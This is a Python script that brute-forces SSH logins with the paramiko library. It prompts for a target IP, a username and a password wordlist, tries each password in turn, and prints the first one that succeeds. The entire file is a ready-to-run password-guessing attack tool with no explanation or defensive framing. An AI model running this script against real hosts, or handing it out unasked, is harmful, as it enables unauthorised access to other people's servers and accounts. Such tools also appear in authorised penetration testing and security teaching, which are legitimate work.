import paramiko

def ssh_connect(target, username, password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(target, port=22, username=username, password=password)
        ssh.close()
        return True
    except paramiko.AuthenticationException:
        return False
    except Exception as e:
        print(f"An error occurred: {e}")
        return False

def main():
    target = input('Please enter target IP address: ').strip()
    username = input('Please enter username to bruteforce: ').strip()
    password_file = input('Please enter location of the password file: ').strip()

    if not all([target, username, password_file]):
        print("Please provide all required information.")
        return

    try:
        with open(password_file, 'r') as file:
            for password in file:
                password = password.strip()
                if ssh_connect(target, username, password):
                    print(f"Password found: {password}")
                    return
        print("Password not found.")
    except FileNotFoundError:
        print(f"Password file '{password_file}' not found.")
    except PermissionError:
        print(f"Permission denied to access '{password_file}'.")
    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    main()
